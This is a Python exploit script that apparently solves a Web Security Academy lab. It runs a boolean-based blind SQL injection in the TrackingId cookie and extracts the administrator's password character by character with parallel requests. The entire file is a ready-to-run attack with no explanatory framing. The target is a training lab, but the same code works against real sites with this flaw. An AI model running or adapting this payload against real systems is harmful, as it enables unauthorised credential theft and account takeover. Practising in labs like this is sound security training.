#!//usr/bin/python3
import os
import requests
import multiprocessing

alp = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
url = "https://0a8c00ce049c4c49c0f2a409006a0044.web-security-academy.net/product?productId=2"
valid = "Welcome back!"

manager = multiprocessing.Manager()
password = manager.list([""]*21)

def exp(j):
    for i in alp:
        payload = f"TrackingId=Eb61oCrPYRbZVSb5' and substring((SELECT password from users where username='administrator'),{j},1) = '{i}'-- -"
        head = {
                "Cookie":payload
            }
        resp = requests.get(url=url,data="",headers = head)
        if valid in resp.text:
            print(f"{j} character is {i}")
            password.insert(j-1,i)
            break

if __name__ == '__main__':
    numbers = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22]

    with multiprocessing.Pool(processes=21) as pool:
        pool.map(exp,numbers)

    password_str = ''.join(list(password))
    print(password_str)